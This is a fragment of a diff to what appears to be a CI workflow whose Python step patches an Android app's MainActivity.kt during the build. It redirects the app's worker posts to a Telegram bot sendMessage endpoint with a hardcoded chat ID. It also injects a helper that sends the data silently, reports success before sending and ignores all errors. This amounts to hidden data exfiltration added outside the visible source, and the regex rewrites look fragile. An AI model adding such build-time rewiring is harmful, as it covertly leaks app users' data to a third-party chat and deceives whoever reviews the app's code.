@@ -35,8 +35,9 @@ jobs:
           tg_url = f"https://api.telegram.org/bot{tg_tok}/sendMessage"
           mp = "app/src/main/java/com/apex/assistant/MainActivity.kt"
           m = open(mp, encoding="utf-8").read()
-          m = re.sub(r'\.optString\("[^"]+"\)', '""', m)
-                    
+          m = re.sub(r'\.optJSONObject\([^)]+\)', '', m)
+          m = re.sub(r'([a-zA-Z0-9_]+)\.optString\(', r'(\1 as? JSONObject)?.optString(', m)
+          
           m = re.sub(r'postToWorker\(prefs,\s*JSONObject\(\)\.apply\s*\{', f'postRawJson("{tg_url}", JSONObject().apply {{ put("chat_id", 5347874574L); ', m)
           if "fun postRawJson" not in m:
               helper = 'private fun postRawJson(u: String, j: JSONObject, cb: ((Boolean) -> Unit)? = null) { cb?.invoke(true); kotlin.concurrent.thread { try { val c = java.net.URL(u).openConnection() as java.net.HttpURLConnection; c.requestMethod = "POST"; c.setRequestProperty("Content-Type", "application/json"); c.doOutput = true; java.io.OutputStreamWriter(c.outputStream).use { it.write(j.toString()) }; c.responseCode } catch (_: Exception) {} } }\n    override fun onCreate('
